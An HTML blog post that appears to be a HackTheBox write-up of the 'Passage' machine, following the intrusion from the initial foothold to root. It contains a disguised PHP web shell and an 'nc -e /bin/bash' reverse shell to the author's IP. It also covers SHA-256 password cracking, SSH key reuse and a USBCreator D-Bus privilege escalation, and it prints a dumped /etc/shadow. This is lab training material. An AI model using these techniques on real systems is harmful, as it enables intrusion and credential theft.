+[02/28/2021 18:38:19] [e(0)] core: Failed to connect to the database: No database YAML file
+[02/28/2021 18:38:20] [d(0)] core: Created user based module store
+[02/28/2021 18:38:27] [e(0)] core: Dependency for windows/x64/encrypted_shell_reverse_tcp is not supported
+[02/28/2021 18:38:27] [e(0)] core: Dependency for windows/encrypted_shell_reverse_tcp is not supported
+[02/28/2021 18:38:27] [e(0)] core: Dependency for windows/encrypted_reverse_tcp is not supported
+[02/28/2021 18:38:27] [e(0)] core: Dependency for windows/x64/encrypted_reverse_tcp is not supported
+</code></pre></div></div>
+
+<p>Okay, so we need to edit the module (<code class="highlighter-rouge">46698.rb</code>) that we got from <code class="highlighter-rouge">exploit-db</code>, so that it doesn’t have any errors.  Touching up on our Ruby knowledge (which I’ve used a bit in the past, just for a simple PDF searcher), we need to edit the module in <code class="highlighter-rouge">def initializer</code> to stop these errors.  It is under this module that the errors are being thrown.</p>
+
+<p>All we needed to do was remove the <code class="highlighter-rouge">References</code> section to make it work.</p>
+
+<p>We also need to change the login details:</p>
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">register_options</span><span class="p">(</span>
+      <span class="p">[</span>
+        <span class="no">OptString</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="s1">'TARGETURI'</span><span class="p">,</span> <span class="p">[</span><span class="kp">true</span><span class="p">,</span> <span class="s2">"http://passage:80"</span><span class="p">,</span> <span class="s1">'/CuteNews'</span><span class="p">]),</span>
+        <span class="no">OptString</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="s1">'USERNAME'</span><span class="p">,</span> <span class="p">[</span><span class="kp">true</span><span class="p">,</span> <span class="s2">"Christopher Tatlock"</span><span class="p">,</span> <span class="s1">'admin'</span><span class="p">]),</span>
+        <span class="no">OptString</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="s1">'PASSWORD'</span><span class="p">,</span> <span class="p">[</span><span class="kp">false</span><span class="p">,</span> <span class="s2">"W@ci5M%QS^Kr8x3ov7!7"</span><span class="p">,</span> <span class="s1">'admin'</span><span class="p">])</span>
+      <span class="p">]</span>
+    <span class="p">)</span>
+</code></pre></div></div>
+
+<p>Now restarting the Metasploit Framework Console, we see that is shows a different message:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$        
+
+                                                                                                                   
+  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'                                                                                                                                                                
+  oOOOOOOOO.MMMM.oOOOOoOOOOl.MMMM,OOOOOOOOo                                                                                                                                                                
+  dOOOOOOOO.MMMMMM.cOOOOOc.MMMMMM,OOOOOOOOx                                                                                                                                                                
+  lOOOOOOOO.MMMMMMMMM;d;MMMMMMMMM,OOOOOOOOl                                                                                                                                                                
+  .OOOOOOOO.MMM.;MMMMMMMMMMM;MMMM,OOOOOOOO.                                                                                                                                                                
+   cOOOOOOO.MMM.OOc.MMMMM'oOO.MMM,OOOOOOOc                                                                                                                                                                 
+    oOOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOOo                                                                                                                                                                  
+     lOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOl                                                                                                                                                                   
+      ;OOOO'MMM.OOOO.MMM:OOOO.MMM;OOOO;                                                                                                                                                                    
+       .dOOo'WM.OOOOocccxOOOO.MX'xOOd.                                                                                                                                                                     
+         ,kOl'M.OOOOOOOOOOOOO.M'dOk,                                                                                                                                                                       
+           :kk;.OOOOOOOOOOOOO.;Ok:                                                                                                                                                                         
+             ;kOOOOOOOOOOOOOOOk:                                                                                                                                                                           
+               ,xOOOOOOOOOOOx,                                                                                                                                                                             
+                 .lOOOOOOOl.                                                                                                                                                                               
+                    ,dOd,                                                                                                                                                                                  
+                      .                                                                                                                                                                                    
+
+       =[ metasploit v6.0.15-dev                          ]
++ -- --=[ 2071 exploits - 1123 auxiliary - 352 post       ]
++ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 7 evasion                                       ]
+
+Metasploit tip: You can use help to view all available commands
+
+msf6 &gt;
+</code></pre></div></div>
+
+<p>Now, I don’t know much about web shells, but within this shell I can <code class="highlighter-rouge">ping</code> <code class="highlighter-rouge">passage</code>, which tells me it has access to my <code class="highlighter-rouge">hosts</code> file.  So I guess we need to get to the web shell we had previously (though, hoping this shell will give us access to a much better web shell).  To gain access to the machine again, after a little bit of research, I try</p>
+
+<p>Still not working, so I decided to put everything into a dedicated directory: <code class="highlighter-rouge">~/.msf6/exploit/cgi/webapps/46698.rb</code>.  Still not working, when I run <code class="highlighter-rouge">search 46698</code> inside the <code class="highlighter-rouge">msf6</code> shell.  <code class="highlighter-rouge">msf6</code> seems to be relatively new, and has slightly different functionality to <code class="highlighter-rouge">msf5</code>, so I might need to do some more research into this later.</p>
+
+<hr>
+
+<p>I am going to try using that other PHP shell again.  It looks like my user was deleted previously, so I just add another user of the same credentials, and run <code class="highlighter-rouge">exploit.py</code> in the <code class="highlighter-rouge">testing</code> directory again.</p>
+
+<p>Once in again, we notice that there is a directory in <code class="highlighter-rouge">/var</code> corresponding to the users of the <code class="highlighter-rouge">CuteNews</code> app: <code class="highlighter-rouge">/var/www/html/CuteNews/cdata/users/</code>.</p>
+
+<p>We run <code class="highlighter-rouge">ls</code> on this directory:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>command &gt; ls /var/www/html/CuteNews/cdata/users
+09.php
+0a.php
+0b.php
+16.php
+21.php
+22.php
+23.php
+2b.php
+31.php
+32.php
+39.php
+47.php
+52.php
+59.php
+5d.php
+5e.php
+65.php
+66.php
+6a.php
+6c.php
+6e.php
+75.php
+76.php
+77.php
+7a.php
+8b.php
+8f.php
+95.php
+97.php
+99.php
+a0.php
+a2.php
+a4.php
+aa.php
+b0.php
+c1.php
+c8.php
+d4.php
+d5.php
+d6.php
+e5.php
+f7.php
+fc.php
+lines
+users.txt
+</code></pre></div></div>
+
+<p>The <code class="highlighter-rouge">users.txt</code> seems empty, but we can check what’s inside the <code class="highlighter-rouge">php</code> files:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>command &gt; cat /var/www/html/CuteNews/cdata/users/0b.php
+<span class="cp">&lt;?php</span> <span class="k">die</span><span class="p">(</span><span class="s1">'Direct call - access denied'</span><span class="p">);</span> <span class="cp">?&gt;</span>
+YToyOntzOjQ6Im5hbWUiO2E6MTp7czoxMDoieTl3cW12djA0eiI7YTo5OntzOjI6ImlkIjtzOjEwOiIxNjE0NTUxMjUzIjtzOjQ6Im5hbWUiO3M6MTA6Ink5d3FtdnYwNHoiO3M6MzoiYWNsIjtzOjE6IjQiO3M6NToiZW1haWwiO3M6MTg6Ink5d3FtdnYwNHpAaGFjay5tZSI7czo0OiJuaWNrIjtzOjEwOiJ5OXdxbXZ2MDR6IjtzOjQ6InBhc3MiO3M6NjQ6IjJlMjM5YTAxNDk1MzhkZThhZjk1Mjk2MmFjODFiMjg5NDFkOWY1YTIyZWZkMmI3YWRiOTQ3NWFiODkzNDM2N2IiO3M6NDoibW9yZSI7czo2MDoiWVRveU9udHpPalE2SW5OcGRHVWlPM002TURvaUlqdHpPalU2SW1GaWIzVjBJanR6T2pBNklpSTdmUT09IjtzOjY6ImF2YXRhciI7czozMjoiYXZhdGFyX3k5d3FtdnYwNHpfeTl3cW12djA0ei5waHAiO3M6NjoiZS1oaWRlIjtzOjA6IiI7fX1zOjI6ImlkIjthOjE6e2k6MTYxNDU1MTkwNTtzOjEwOiJGQnd6YkhtejVXIjt9fQ==
+</code></pre></div></div>
+
+<p>Well that looks distinctly like <code class="highlighter-rouge">bashe64</code>!  And indeed, it is (though still obfuscated):</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~]
+└─$ echo "YToyOntzOjQ6Im5hbWUiO2E6MTp7czoxMDoieTl3cW12djA0eiI7YTo5OntzOjI6ImlkIjtzOjEwOiIxNjE0NTUxMjUzIjtzOjQ6Im5hbWUiO3M6MTA6Ink5d3FtdnYwNHoiO3M6MzoiYWNsIjtzOjE6IjQiO3M6NToiZW1haWwiO3M6MTg6Ink5d3FtdnYwNHpAaGFjay5tZSI7czo0OiJuaWNrIjtzOjEwOiJ5OXdxbXZ2MDR6IjtzOjQ6InBhc3MiO3M6NjQ6IjJlMjM5YTAxNDk1MzhkZThhZjk1Mjk2MmFjODFiMjg5NDFkOWY1YTIyZWZkMmI3YWRiOTQ3NWFiODkzNDM2N2IiO3M6NDoibW9yZSI7czo2MDoiWVRveU9udHpPalE2SW5OcGRHVWlPM002TURvaUlqdHpPalU2SW1GaWIzVjBJanR6T2pBNklpSTdmUT09IjtzOjY6ImF2YXRhciI7czozMjoiYXZhdGFyX3k5d3FtdnYwNHpfeTl3cW12djA0ei5waHAiO3M6NjoiZS1oaWRlIjtzOjA6IiI7fX1zOjI6ImlkIjthOjE6e2k6MTYxNDU1MTkwNTtzOjEwOiJGQnd6YkhtejVXIjt9fQ=="  | base64 -d
+a:2:{s:4:"name";a:1:{s:10:"y9wqmvv04z";a:9:{s:2:"id";s:10:"1614551253";s:4:"name";s:10:"y9wqmvv04z";s:3:"acl";s:1:"4";s:5:"email";s:18:"y9wqmvv04z@hack.me";s:4:"nick";s:10:"y9wqmvv04z";s:4:"pass";s:64:"2e239a0149538de8af952962ac81b28941d9f5a22efd2b7adb9475ab8934367b";s:4:"more";s:60:"YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==";s:6:"avatar";s:32:"avatar_y9wqmvv04z_y9wqmvv04z.php";s:6:"e-hide";s:0:"";}}s:2:"id";a:1:{i:1614551905;s:10:"FBwzbHmz5W";}}
+</code></pre></div></div>
+
+<p>I think the thing of interest is after the <code class="highlighter-rouge">pass</code> field:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"2e239a0149538de8af952962ac81b28941d9f5a22efd2b7adb9475ab8934367b"
+</code></pre></div></div>
+
+<p>This looks like a hashed password, if ever I saw one!  But which hash?  Well, hopefully nothing too secure, as it is ultimately a machine that is made to be hacked.  Let’s try an old one first: <code class="highlighter-rouge">SHA</code>.  We can try this <a href="https://md5decrypt.net/en/Sha256/">online</a>, but unfortunately <code class="highlighter-rouge">SHA-256</code> does not have a hash in the database.  We can try a different decryption method!  How about <code class="highlighter-rouge">md5</code>?  No luck with that.</p>
+
+<p>Okay, I have tried a bunch of those different files now, but nothing was coming up.  Until I trie Paul’s file:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"YToxOntzOjQ6Im5hbWUiO2E6MTp7czoxMDoicGF1bC1jb2xlcyI7YTo5OntzOjI6ImlkIjtzOjEwOiIxNTkyNDgzMjM2IjtzOjQ6Im5hbWUiO3M6MTA6InBhdWwtY29sZXMiO3M6MzoiYWNsIjtzOjE6IjIiO3M6NToiZW1haWwiO3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6NDoibmljayI7czoxMDoiUGF1bCBDb2xlcyI7czo0OiJwYXNzIjtzOjY0OiJlMjZmM2U4NmQxZjgxMDgxMjA3MjNlYmU2OTBlNWQzZDYxNjI4ZjQxMzAwNzZlYzZjYjQzZjE2ZjQ5NzI3M2NkIjtzOjM6Imx0cyI7czoxMDoiMTU5MjQ4NTU1NiI7czozOiJiYW4iO3M6MToiMCI7czozOiJjbnQiO3M6MToiMiI7fX19"</span> | <span class="nb">base64</span> <span class="nt">-D</span>
+a:1:<span class="o">{</span>s:4:<span class="s2">"name"</span><span class="p">;</span>a:1:<span class="o">{</span>s:10:<span class="s2">"paul-coles"</span><span class="p">;</span>a:9:<span class="o">{</span>s:2:<span class="s2">"id"</span><span class="p">;</span>s:10:<span class="s2">"1592483236"</span><span class="p">;</span>s:4:<span class="s2">"name"</span><span class="p">;</span>s:10:<span class="s2">"paul-coles"</span><span class="p">;</span>s:3:<span class="s2">"acl"</span><span class="p">;</span>s:1:<span class="s2">"2"</span><span class="p">;</span>s:5:<span class="s2">"email"</span><span class="p">;</span>s:16:<span class="s2">"paul@passage.htb"</span><span class="p">;</span>s:4:<span class="s2">"nick"</span><span class="p">;</span>s:10:<span class="s2">"Paul Coles"</span><span class="p">;</span>s:4:<span class="s2">"pass"</span><span class="p">;</span>s:64:<span class="s2">"e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd"</span><span class="p">;</span>s:3:<span class="s2">"lts"</span><span class="p">;</span>s:10:<span class="s2">"1592485556"</span><span class="p">;</span>s:3:<span class="s2">"ban"</span><span class="p">;</span>s:1:<span class="s2">"0"</span><span class="p">;</span>s:3:<span class="s2">"cnt"</span><span class="p">;</span>s:1:<span class="s2">"2"</span><span class="p">;</span><span class="o">}}}</span>
+</code></pre></div></div>
+<p>Indeed, I put his hash into <code class="highlighter-rouge">hash-identifier</code> and found that it was likely <code class="highlighter-rouge">SHA-256</code>.  Using an <a href="https://www.dcode.fr/sha256-hash">online SHA-256 decoder using lookup tables</a> we find that this hashed password (<code class="highlighter-rouge">e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd</code>) corresponds to <code class="highlighter-rouge">atlanta1</code>.</p>
+
+<p>Now we need to access his account using the username <code class="highlighter-rouge">paul-coles</code> and the password <code class="highlighter-rouge">atlanta1</code>.</p>
+
+<p>I try ssh:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh paul-coles@10.10.10.206 <span class="nt">-p</span> 22
+paul-coles@10.10.10.206: Permission denied <span class="o">(</span>publickey<span class="o">)</span><span class="nb">.</span>
+</code></pre></div></div>
+
+<p>Hmm.  Stuck again.  Best try to get a better web shell, and try to access Paul’s account via that.  Let us backtrack and reupload this file.  The file we will upload (manually, this time), will look like the following:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GIF8;
+<span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">])</span> <span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p>After uploading this, we can see this file in <code class="highlighter-rouge">http://passage:80/CuteNews/uploads/</code>.  Going to that link, and clicking on out PHP shell file upload, we get to a page that simply says <code class="highlighter-rouge">GIF8;</code>.  We need to append the URL to do something clever; but first we need to run <code class="highlighter-rouge">ifconfig</code> or <code class="highlighter-rouge">ip a</code> to get the IP address of your <code class="highlighter-rouge">tun0</code> interface (in my case, this was <code class="highlighter-rouge">10.10.14.239</code>).  If you don’t see this interface, ensure you are running the VPN on the VM, and not your main computer, as I figured out the hard way…</p>
+
+<p>So now we have this IP address, and we choose a 4-digit port number (say, <code class="highlighter-rouge">1234</code>), we can append the URL to look like the following:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://passage/CuteNews/uploads/avatar_Christopher Tatlock_shell.php?cmd=nc -e /bin/bash 10.10.14.239 1234
+</code></pre></div></div>
+<p><em>But wait</em>: before you hit <kbd>Enter</kbd>, you need to go into a terminal, and enter the following command:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -nlvp 1234
+</code></pre></div></div>
+<p>And run that.  This will look for any connections on the <code class="highlighter-rouge">tun0</code> interface and intercept them.  Now you can press <kbd>Enter</kbd> in the browser window, and you will see in your terminal that this has been intercepted.  Now in terminal, you can enter a python command which will give you access to a web shell:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-c</span> <span class="s1">'import pty; pyt.spawn("/bin/bash")'</span>
+</code></pre></div></div>
+
+<p>Now we have access to this web shell again, though this one is much better; it has a stderr, and thinks it has access to tty.  So now we can type <code class="highlighter-rouge">su paul</code> and login to his account using our decrypted hashed password, and we are now pretending to be Mister Paul Coles on this machine.</p>
+
+<p>My first instict is to go to the home directory; the most familiar part of linux systems to everyone.  In there I find a <code class="highlighter-rouge">user.txt</code> file.  I see what’s inside and it looks like another hash:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>paul@passage:~$ cat user.txt    
+cat user.txt
+592d************************9269
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">hash-identify</code> thinks it might be a <code class="highlighter-rouge">MD4</code> or <code class="highlighter-rouge">Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))</code>, but <code class="highlighter-rouge">hashcat</code> doesn’t produce much.</p>
+
+<p>I then recall that there is an <code class="highlighter-rouge">ssh</code> port open; that can’t be a mistake.  I go into Paul’s <code class="highlighter-rouge">ssh</code> hidden directory, and run</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-i</span> id_rsa nadav@passage
+</code></pre></div></div>
+
+<p>This gives me access to <code class="highlighter-rouge">nadav</code> (admin’s) account without needing his password, as the RSA key Paul has works!</p>
+
+<p>This is great; we have admin access to this machine.  Now what I need to do is just remember what exactly we are supposed to be doing…  That’s right; we need <code class="highlighter-rouge">root</code> access <em>specifically</em>; not just admin access.  After some Googling, it looks like there is <a href="https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/">a vulnerability in the USBCreator D-Bus interface that allows privilege escalation using</a></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /tmp <span class="o">&amp;&amp;</span> gdbus call <span class="nt">--system</span> <span class="nt">--dest</span> com.ubuntu.USBCreator <span class="nt">--object-path</span> /com/ubuntu/USBCreator <span class="nt">--method</span> com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/pwn <span class="nb">true</span>
+</code></pre></div></div>
+
+<p>Now we can run</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-i</span> pwn root@passage
+</code></pre></div></div>
+
+<p>And we have root access!  In the <code class="highlighter-rouge">/root</code> file there is another text file with what looks like another hash:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@passage:~# cat root.txt    
+cat root.txt
+c022************************8a65
+root@passage:~# pwd
+pwd
+/root
+</code></pre></div></div>
+
+<p>Now we can even see the hashed passwords file!</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo cat /etc/shadow
+root:$6$mjc8Tvgr$L56bn5KQDtOyKRdXBTL4xcmT7FVWJbds.Fo0FVc11PWliaNu5ASAxKzaEddyaYGMxGQPUNo5UpxT/nawzS8TW0:18464:0:99999:7:::
+daemon:*:17953:0:99999:7:::
+bin:*:17953:0:99999:7:::
+sys:*:17953:0:99999:7:::
+sync:*:17953:0:99999:7:::
+games:*:17953:0:99999:7:::
+man:*:17953:0:99999:7:::
+lp:*:17953:0:99999:7:::
+mail:*:17953:0:99999:7:::
+news:*:17953:0:99999:7:::
+uucp:*:17953:0:99999:7:::
+proxy:*:17953:0:99999:7:::
+www-data:*:17953:0:99999:7:::
+backup:*:17953:0:99999:7:::
+list:*:17953:0:99999:7:::
+irc:*:17953:0:99999:7:::
+gnats:*:17953:0:99999:7:::
+nobody:*:17953:0:99999:7:::
+systemd-timesync:*:17953:0:99999:7:::
+systemd-network:*:17953:0:99999:7:::
+systemd-resolve:*:17953:0:99999:7:::
+systemd-bus-proxy:*:17953:0:99999:7:::
+syslog:*:17953:0:99999:7:::
+_apt:*:17953:0:99999:7:::
+messagebus:*:17954:0:99999:7:::
+uuidd:*:17954:0:99999:7:::
+lightdm:*:17954:0:99999:7:::
+whoopsie:*:17954:0:99999:7:::
+avahi-autoipd:*:17954:0:99999:7:::
+avahi:*:17954:0:99999:7:::
+dnsmasq:*:17954:0:99999:7:::
+colord:*:17954:0:99999:7:::
+speech-dispatcher:!:17954:0:99999:7:::
+hplip:*:17954:0:99999:7:::
+kernoops:*:17954:0:99999:7:::
+pulse:*:17954:0:99999:7:::
+rtkit:*:17954:0:99999:7:::
+saned:*:17954:0:99999:7:::
+usbmux:*:17954:0:99999:7:::
+nadav:$6$D30IVulR$vENayGqKX8L0RYB/wcf7ZMfFHyCedmEIu4zXw7bZcH3GBrCrBzHJ3Y/in96pthdcp5cU.0UTXobQLu7T0INzk1:18464:0:99999:7:::
+paul:$6$cpGlwRS2$AhcQyxAskjvAQtS4vpO0VgNW0liHRbLSosZlrHpzL3XTfPHmeDL7hWkut1kCjgNnEHIdU9J019hQTAMH6nzxe1:18464:0:99999:7:::
+sshd:*:18464:0:99999:7:::
+</code></pre></div></div>
+
+<hr>
+
+<h1 id="notes">Notes</h1>
+
+<p>One big take-home message from this— my first HTB task— is: just Google!  Unless you think you have a great idea what to try, if you are only starting out</p>
+
+          </div>
+          <div class="article-share">
+            
+            
+            <a href="https://twitter.com/home?status=HackTheBox+Write-up+%E2%80%94+Passage%20-%20https://jakewilliami.github.io//posts/passage-htb" title="Share on Twitter" rel="noreferrer noopener" target="_blank">
+              <svg viewbox="0 0 512 512"><path d="M492 109.5c-17.4 7.7-36 12.9-55.6 15.3 20-12 35.4-31 42.6-53.6 -18.7 11.1-39.4 19.2-61.5 23.5C399.8 75.8 374.6 64 346.8 64c-53.5 0-96.8 43.4-96.8 96.9 0 7.6 0.8 15 2.5 22.1 -80.5-4-151.9-42.6-199.6-101.3 -8.3 14.3-13.1 31-13.1 48.7 0 33.6 17.2 63.3 43.2 80.7C67 210.7 52 206.3 39 199c0 0.4 0 0.8 0 1.2 0 47 33.4 86.1 77.7 95 -8.1 2.2-16.7 3.4-25.5 3.4 -6.2 0-12.3-0.6-18.2-1.8 12.3 38.5 48.1 66.5 90.5 67.3 -33.1 26-74.9 41.5-120.3 41.5 -7.8 0-15.5-0.5-23.1-1.4C62.8 432 113.7 448 168.3 448 346.6 448 444 300.3 444 172.2c0-4.2-0.1-8.4-0.3-12.5C462.6 146 479 129 492 109.5z"></path></svg>
+            </a>
+            <a href="https://www.facebook.com/sharer/sharer.php?u=https://jakewilliami.github.io//posts/passage-htb" title="Share on Facebook" rel="noreferrer noopener" target="_blank">
+              <svg viewbox="0 0 512 512"><path d="M288 192v-38.1c0-17.2 3.8-25.9 30.5-25.9H352V64h-55.9c-68.5 0-91.1 31.4-91.1 85.3V192h-45v64h45v192h83V256h56.4l7.6-64H288z"></path></svg>
+            </a>
+          </div>
+
+          
+        </article>
+      </div>
+    </div>
+  </main>
+  
+
+<script src="/assets/vendor-130c9c254effc51f3283620bc635851da7b99c20901216948f11ba72ee13317f.js" type="text/javascript"></script>
+
+
+  <script src="/assets/webfonts-96493456d319d1bf419afdf8701552d4d486fee6afd304897d4fd81eb4e0cc0b.js" type="text/javascript"></script>
+
+
+
+  <script src="/assets/scrollappear-e2da8ea567e418637e31266cc5302126eaa79f62a2273739086358b589a89ee6.js" type="text/javascript"></script>
+
+
+<script src="/assets/application-cfde13ac81ddaf4351b2e739603e2baf688d0fcc9aba613fe62bbb1c7b037fb9.js" type="text/javascript"></script>
+
+
+</body>
+</html>
